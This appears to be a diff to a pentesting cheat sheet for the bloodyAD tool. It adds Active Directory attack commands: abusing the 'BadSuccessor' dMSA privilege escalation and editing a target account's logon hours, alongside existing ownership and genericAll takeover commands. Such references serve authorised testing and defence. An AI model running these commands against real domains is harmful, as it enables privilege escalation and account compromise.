@@ -60,3 +60,14 @@ bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add dnsRecord <record_n
 ```
 bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <trustee>; bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <trustee>
 ```
+
+## Abuse BadSuccessor
+```
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' -p '<passwd>' add badSuccessor dmsa
+```
+
+
+## Edit Logon Hours
+```
+bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' -p '<passwd>' set object <target> logonHours -v ////////////////////////////// --b46
+```
